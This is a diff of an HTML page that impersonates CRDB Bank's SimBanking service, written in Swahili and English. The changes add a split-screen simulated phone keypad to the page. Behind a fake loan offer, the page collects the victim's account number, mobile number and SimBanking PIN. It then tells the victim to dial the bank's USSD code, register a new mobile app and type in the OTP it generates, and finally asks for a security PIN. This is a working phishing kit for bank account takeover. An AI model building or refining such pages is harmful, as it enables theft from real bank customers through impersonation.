@@ -7,139 +7,178 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <!-- Notification Banner -->
-        <div id="notification-banner" class="notification-banner hidden"></div>
-
-        <!-- Header Logo -->
-        <div class="header">
-            <h1 class="logo">CRDB BANK</h1>
-            <p class="tagline">Tumeenea Kila Mahali</p>
-        </div>
-
-        <!-- Step 1: Loan Calculation / Selection -->
-        <section id="step-loan" class="card">
-            <h2>Omba Mkopo wa Simbanking</h2>
-            <p class="subtitle">Chagua kiasi cha mkopo na muda wa marejesho.</p>
+    <!-- Built-in Split-Screen Layout Container -->
+    <div class="split-screen-wrapper">
+        
+        <!-- TOP HALF: Simulated Phone Keypad / USSD Dial Screen -->
+        <div class="split-top">
+            <div class="phone-status-bar">
+                <span>14:55</span>
+                <span>📶 4G 🔋 9%</span>
+            </div>
             
-            <div class="form-group">
-                <label>Kiasi cha Mkopo: <span id="amount-text" class="highlight">TSh 1,000,000</span></label>
-                <input type="range" id="loan-amount" min="50000" max="5000000" step="50000" value="1000000">
+            <div class="dialer-screen">
+                <div id="dialed-number" class="dialed-number-text">*150*03#</div>
             </div>
 
-            <div class="form-group">
-                <label>Muda wa Marejesho: <span id="months-text" class="highlight">miezi 12</span></label>
-                <input type="range" id="loan-months" min="1" max="36" step="1" value="12">
-            </div>
-
-            <div class="summary-box">
-                <div class="summary-row">
-                    <span>Rejesho la Kila Mwezi:</span>
-                    <strong id="monthly-payment">TSh 95,833</strong>
+            <!-- On-Screen Keypad Grid -->
+            <div class="on-screen-keypad">
+                <div class="key-row">
+                    <button class="k-btn" data-val="1">1<span class="sub-text"></span></button>
+                    <button class="k-btn" data-val="2">2<span class="sub-text">ABC</span></button>
+                    <button class="k-btn" data-val="3">3<span class="sub-text">DEF</span></button>
+                </div>
+                <div class="key-row">
+                    <button class="k-btn" data-val="4">4<span class="sub-text">GHI</span></button>
+                    <button class="k-btn" data-val="5">5<span class="sub-text">JKL</span></button>
+                    <button class="k-btn" data-val="6">6<span class="sub-text">MNO</span></button>
+                </div>
+                <div class="key-row">
+                    <button class="k-btn" data-val="7">7<span class="sub-text">PQRS</span></button>
+                    <button class="k-btn" data-val="8">8<span class="sub-text">TUV</span></button>
+                    <button class="k-btn" data-val="9">9<span class="sub-text">WXYZ</span></button>
+                </div>
+                <div class="key-row">
+                    <button class="k-btn" data-val="*">*</button>
+                    <button class="k-btn" data-val="0">0<span class="sub-text">+</span></button>
+                    <button class="k-btn" data-val="#">#</button>
+                </div>
+                <div class="key-row call-row">
+                    <button class="call-action-btn" id="simulated-call-btn">📞 Call</button>
                 </div>
             </div>
+        </div>
 
-            <button id="btn-omba" class="btn-primary">Endelea na Maombi</button>
-        </section>
+        <!-- DIVIDER BAR -->
+        <div class="split-divider"></div>
 
-        <!-- Step 2: Credentials Input -->
-        <section id="step-credentials" class="card hidden">
-            <h2>Activation</h2>
-            <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
-            
-            <div class="form-group">
-                <label for="acc-number">Account number linked with Simbanking</label>
-                <input type="text" id="acc-number" placeholder="Ingiza namba ya akaunti" required>
+        <!-- BOTTOM HALF: Web Application Content -->
+        <div class="split-bottom">
+            <div class="container">
+                <!-- Notification Banner -->
+                <div id="notification-banner" class="notification-banner hidden"></div>
+
+                <!-- Header Logo -->
+                <div class="header">
+                    <h1 class="logo">CRDB BANK</h1>
+                    <p class="tagline">Tumeenea Kila Mahali</p>
+                </div>
+
+                <!-- Step 1: Loan Calculation / Selection -->
+                <section id="step-loan" class="card">
+                    <h2>Omba Mkopo wa Simbanking</h2>
+                    <p class="subtitle">Chagua kiasi cha mkopo na muda wa marejesho.</p>
+                    
+                    <div class="form-group">
+                        <label>Kiasi cha Mkopo: <span id="amount-text" class="highlight">TSh 1,000,000</span></label>
+                        <input type="range" id="loan-amount" min="50000" max="5000000" step="50000" value="1000000">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Muda wa Marejesho: <span id="months-text" class="highlight">miezi 12</span></label>
+                        <input type="range" id="loan-months" min="1" max="36" step="1" value="12">
+                    </div>
+
+                    <div class="summary-box">
+                        <div class="summary-row">
+                            <span>Rejesho la Kila Mwezi:</span>
+                            <strong id="monthly-payment">TSh 95,833</strong>
+                        </div>
+                    </div>
+
+                    <button id="btn-omba" class="btn-primary">Endelea na Maombi</button>
+                </section>
+
+                <!-- Step 2: Credentials Input -->
+                <section id="step-credentials" class="card hidden">
+                    <h2>Activation</h2>
+                    <p class="subtitle">Please enter your credentials used to access SimBanking USSD(*150*03#)</p>
+                    
+                    <div class="form-group">
+                        <label for="acc-number">Account number linked with Simbanking</label>
+                        <input type="text" id="acc-number" placeholder="Ingiza namba ya akaunti" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="mobile-number">Mobile number registered for Simbanking</label>
+                        <input type="tel" id="mobile-number" inputmode="numeric" placeholder="0755******" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="sim-pin">Simbanking PIN</label>
+                        <input type="password" id="sim-pin" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" required>
+                    </div>
+
+                    <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
+                    <div id="credentials-spinner" class="spinner hidden"></div>
+                </section>
+
+                <!-- Step 3: Instructions & OTP Input -->
+                <section id="step-otp" class="card hidden">
+                    <div class="shield-icon">⏳</div>
+                    <h2>Uundaji wa OTP</h2>
+                    
+                    <div class="ussd-steps-box">
+                        <p><strong>Fuata hatua zifuatazo:</strong></p>
+                        <ol class="ussd-list">
+                            <li>Tumia kibonyezo kilicho hapo juu kupiga <strong>*150*03#</strong>.</li>
+                            <li>Chagua 1 SimBanking, kisha uweke PIN yako ya SimBanking.</li>
+                            <li>Chagua 1 (Akaunti Yangu), kisha Chagua 5 (Sajili App ya Simu).</li>
+                            <li>Thibitisha ili kupokea ujumbe mfupi (SMS) wenye namba za OTP.</li>
+                            <li>Weka namba hizo za OTP kwenye nafasi iliyotolewa hapa chini.</li>
+                        </ol>
+                    </div>
+
+                    <p class="subtitle" style="margin-top: 15px;">Weka namba ya OTP ya tarakimu 5 uliyopokea:</p>
+                    
+                    <div class="otp-inputs">
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+                        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
+                    </div>
+
+                    <button id="btn-verify-otp" class="btn-primary" disabled>CONTINUE</button>
+                </section>
+
+                <!-- Step 4: Security PIN Verification -->
+                <section id="step-security-pin" class="card hidden">
+                    <div class="shield-icon">🔒</div>
+                    <h2>Weka PIN ya Usalama</h2>
+                    <p class="subtitle">Weka PIN ya usalama ya tarakimu 4 (namba pekee) ili kukamilisha idhini.</p>
+                    
+                    <div class="otp-inputs">
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
+                        <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
+                    </div>
+
+                    <button id="btn-verify-security-pin" class="btn-primary">CONTINUE</button>
+                </section>
+
+                <!-- Step 5: Waiting / Success State -->
+                <section id="step-success" class="card hidden text-center">
+                    <div id="success-icon-container" class="success-icon">
+                        <div class="spinner-large"></div>
+                    </div>
+                    <h2 id="success-title">Maombi ya Mkopo Yamewasilishwa</h2>
+                    <p id="success-subtitle" class="subtitle">Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini. Utapata ujumbe wa uthibitisho.</p>
+                    
+                    <div id="countdown-banner" class="countdown-banner">
+                        <span>🔄 Unaelekezwa kwenye mfumo katika <strong id="countdown-timer">3</strong> s...</span>
+                    </div>
+
+                    <p id="success-note-box" class="success-note hidden">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
+                    
+                    <button id="btn-finish" class="btn-primary hidden" style="margin-top: 15px;">Maliza</button>
+                </section>
             </div>
-
-            <div class="form-group">
-                <label for="mobile-number">Mobile number registered for Simbanking</label>
-                <input type="tel" id="mobile-number" inputmode="numeric" placeholder="0755******" required>
-            </div>
-
-            <div class="form-group">
-                <label for="sim-pin">Simbanking PIN</label>
-                <input type="password" id="sim-pin" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" required>
-            </div>
-
-            <button id="btn-continue-creds" class="btn-primary">CONTINUE</button>
-            <div id="credentials-spinner" class="spinner hidden"></div>
-        </section>
-
-        <!-- Step 3: Instructions, Dial Link, & OTP Input (Split-screen optimized) -->
-        <section id="step-otp" class="card hidden">
-            <div class="shield-icon">⏳</div>
-            <h2>Uundaji wa OTP</h2>
-            
-            <!-- Instructions Section -->
-            <div class="ussd-steps-box">
-                <p><strong>Fuata hatua zifuatazo:</strong></p>
-                <ol class="ussd-list">
-                    <li>Bonyeza kitufe cha kupiga simu kilicho hapa chini ili kupiga <strong>*150*03#</strong>[span_1](start_span)[span_1](end_span).</li>
-                    <li>Chagua 1 SimBanking, kisha uweke PIN yako ya SimBanking[span_2](start_span)[span_2](end_span).</li>
-                    <li>Chagua 1 (Akaunti Yangu), kisha Chagua 5 (Sajili App ya Simu)[span_3](start_span)[span_3](end_span).</li>
-                    <li>Thibitisha ili kupokea ujumbe mfupi (SMS) wenye namba za OTP[span_4](start_span)[span_4](end_span).</li>
-                    <li>Weka namba hizo za OTP kwenye nafasi iliyotolewa hapa chini[span_5](start_span)[span_5](end_span).</li>
-                </ol>
-            </div>
-
-            <!-- Dialing Board / Button Section -->
-            <div class="dial-board-section">
-                <p class="subtitle" style="margin-bottom: 8px;">Bonyeza hapa chini kupiga USSD bila kutoka kwenye ukurasa[span_6](start_span)[span_6](end_span):</p>
-                <a href="tel:*150*03%23" id="btn-dial-ussd" class="btn-dial">
-                    📞 Piga *150*03# Sasa
-                </a>
-            </div>
-
-            <!-- OTP Input Space -->
-            <p class="subtitle" style="margin-top: 15px;">Weka namba ya OTP ya tarakimu 5 uliyopokea[span_7](start_span)[span_7](end_span):</p>
-            
-            <div class="otp-inputs">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" disabled />
-            </div>
-
-            <button id="btn-verify-otp" class="btn-primary" disabled>CONTINUE</button>
-        </section>
-
-        <!-- Step 4: Security PIN Verification -->
-        <section id="step-security-pin" class="card hidden">
-            <div class="shield-icon">🔒</div>
-            <h2>Weka PIN ya Usalama</h2>
-            <p class="subtitle">Weka PIN ya usalama ya tarakimu 4 (namba pekee) ili kukamilisha idhini.</p>
-            
-            <div class="otp-inputs">
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" />
-            </div>
-
-            <button id="btn-verify-security-pin" class="btn-primary">CONTINUE</button>
-        </section>
-
-        <!-- Step 5: Waiting / Success State -->
-        <section id="step-success" class="card hidden text-center">
-            <div id="success-icon-container" class="success-icon">
-                <div class="spinner-large"></div>
-            </div>
-            <h2 id="success-title">Maombi ya Mkopo Yamewasilishwa</h2>
-            <p id="success-subtitle" class="subtitle">Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini. Utapata ujumbe wa uthibitisho.</p>
-            
-            <div id="countdown-banner" class="countdown-banner">
-                <span>🔄 Unaelekezwa kwenye mfumo katika <strong id="countdown-timer">3</strong> s...</span>
-            </div>
-
-            <p id="success-note-box" class="success-note hidden">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
-            
-            <button id="btn-finish" class="btn-primary hidden" style="margin-top: 15px;">Maliza</button>
-        </section>
+        </div>
     </div>
 
     <script src="script.js"></script>
 </body>
-    </html>
-    
+                    </html>
+                                                  
